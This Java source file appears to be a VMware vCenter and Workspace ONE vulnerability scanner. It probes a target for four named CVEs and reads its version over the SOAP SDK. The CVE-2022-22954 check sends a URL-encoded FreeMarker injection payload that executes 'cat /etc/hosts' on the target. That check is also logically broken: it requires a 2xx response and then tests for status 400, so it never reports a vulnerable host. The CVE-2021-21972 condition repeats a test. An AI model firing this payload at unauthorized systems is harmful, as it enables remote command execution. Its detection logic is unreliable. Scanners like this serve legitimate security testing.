package com.example.vcentertools.model;

import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpResponse;
import cn.hutool.core.util.XmlUtil;
import org.w3c.dom.Document;
import org.w3c.dom.NodeList;


public class VulnerabilityScanner {

    /**
     * 执行漏洞检测
     * @param targetUrl 目标 URL
     * @param vulnerability 漏洞类型
     * @return 漏洞扫描结果
     */
    public String scanForVulnerabilities(String targetUrl, String vulnerability) {
        StringBuilder result = new StringBuilder();

        try {
            if ("ALL".equals(vulnerability)) {
                result.append(scanForVERSION(targetUrl)).append("\n");
                result.append(scanForCVE202122005(targetUrl)).append("\n");
                result.append(scanForCVE202121972(targetUrl)).append("\n");
                result.append(scanForCVE202121985(targetUrl)).append("\n");
                result.append(scanForCVE202222954(targetUrl)).append("\n");
            }else if ("CVE-2021-22005".equals(vulnerability)) {
                result.append(scanForCVE202122005(targetUrl)).append("\n");
            } else if ("CVE-2021-21972".equals(vulnerability)) {
                result.append(scanForCVE202121972(targetUrl)).append("\n");
            } else if ("CVE-2021-21985".equals(vulnerability)) {
                result.append(scanForCVE202121985(targetUrl)).append("\n");
            } else if ("CVE-2022-22954".equals(vulnerability)) {
                result.append(scanForCVE202222954(targetUrl)).append("\n");
            }else {
                result.append(" [-] 未知漏洞类型\n");
            }
        } catch (Exception e) {
            result.append(" [-] 检测过程中发生异常: ").append(e.getMessage()).append("\n");
        }
        return result.toString();
    }

    /**
     * 获取目标版本号
     * @param targetUrl 目标URL
     * @return 版本号
     *
     */
    private String scanForVERSION(String targetUrl) {
        try{
            String url = targetUrl + "/sdk";
            String data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                    "<env:Envelope xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:env=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n" +
                    "    <env:Body>\n" +
                    "        <RetrieveServiceContent xmlns=\"urn:vim25\">\n" +
                    "            <_this type=\"ServiceInstance\">ServiceInstance</_this>\n" +
                    "        </RetrieveServiceContent>\n" +
                    "    </env:Body>\n" +
                    "</env:Envelope>";
            String response = HttpRequest.post(url)
                    .body(data)
                    .header("Content-Type", "text/xml")
                    .timeout(10000) // Set timeout for the request (optional)
                    .execute()
                    .body();

            return getTagValue(response, "fullName");
        }catch (Exception e){
            return " [-] 检测目标版本时发生错误: " + e.getMessage();
        }
    }
    public static String getTagValue(String response, String tag) {
        try {
            Document doc = XmlUtil.readXML(response);
            NodeList nodeList = doc.getElementsByTagName(tag);
            if (nodeList.getLength() > 0) {
                return nodeList.item(0).getTextContent();
            }
        } catch (Exception e) {
            return " [-] 检测目标版本时发生错误: " + e.getMessage();
        }
        return "";
    }





    /**
     * CVE-2021-22005 漏洞检测
     * @param targetUrl 目标 URL
     * @return 漏洞检测结果
     */
    private String scanForCVE202122005(String targetUrl) {
        try {
            String url = targetUrl + "/analytics/telemetry/ph/api/level?_c=test";
            HttpResponse response = HttpRequest.get(url)
                    .timeout(5000)
                    .execute();
            int statusCode = response.getStatus();
            String body = response.body();

            if (statusCode == 200) {
                return " [+] 目标存在 CVE-2021-22005 漏洞!";
            } else {
                return " [-] 目标未发现 CVE-2021-22005 漏洞";
            }
        } catch (Exception e) {
            return " [-] 检测 CVE-2021-22005 时发生错误: " + e.getMessage();
        }
    }

    /**
     * CVE-2021-21972 漏洞检测
     * @param targetUrl 目标 URL
     * @return 漏洞检测结果
     */
    private String scanForCVE202121972(String targetUrl) {
        try{
            String url1 = targetUrl + "/ui/vropspluginui/rest/services/uploadova";
            HttpResponse response1 = HttpRequest.get(url1)
                    .timeout(5000)
                    .execute();
            int statusCode1 = response1.getStatus();
            String body1 = response1.body();

            String url2 = targetUrl + "/ui/vropspluginui/rest/services/getstatus";
            HttpResponse response2 = HttpRequest.get(url2)
                    .timeout(5000)
                    .execute();
            int statusCode2 = response2.getStatus();
            String body2 = response2.body();
            if (statusCode1 == 200 && (statusCode1 == 200 && body2.contains("States") && body2.contains("Install Progress"))) {
                return " [+] 目标存在 CVE-2021-21972 漏洞!";
            }else{
                return " [-] 目标未发现 CVE-2021-21972 漏洞!";
            }

        } catch (Exception e) {
            return " [-] 检测 CVE-2021-21972 时发生错误 " + e.getMessage();
        }
    }
    /**
     * CVE-2021-21985 漏洞检测
     * @param targetUrl 目标 URL
     * @return 漏洞检测结果
     */
    private String scanForCVE202121985(String targetUrl) {
        try{
            String url = targetUrl + "/ui/h5-vsan/rest/proxy/service/systemProperties/getProperty";
            HttpResponse response = HttpRequest.get(url)
                    .timeout(5000)
                    .execute();
            int statusCode = response.getStatus();
            String body = response.body();
            if (statusCode == 405){
                return " [+] 目标存在 CVE-2021-21985 漏洞!";
            }else{
                return " [-] 目标未发现 CVE-2021-21985 漏洞!";
            }
        } catch (Exception e) {
            return " [-] 检测 CVE-2021-21985 时发生错误 " + e.getMessage();
        }
    }

    private String scanForCVE202222954(String targetUrl) {
        try{
            String finalUrl = targetUrl + "/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%68%6f%73%74%73%22%29%7d";

            HttpResponse response = HttpRequest.get(finalUrl).execute();
            if (response.isOk() && response.body() != null) {
                String responseBody = response.body();
                if (responseBody.contains("Authorization context is not valid") && response.getStatus() == 400) {
                    return " [+] 目标存在 CVE-2022-22954 漏洞!";
                }else{
                    return " [-] 目标未发现 CVE-2022-22954 漏洞!";
                }
            } else {
                return " [-] CVE-2022-22954 漏洞检测失败！";
            }
        } catch (Exception e) {
            return " [-] 检测 CVE-2022-22954 时发生错误 " + e.getMessage();
        }
    }
}
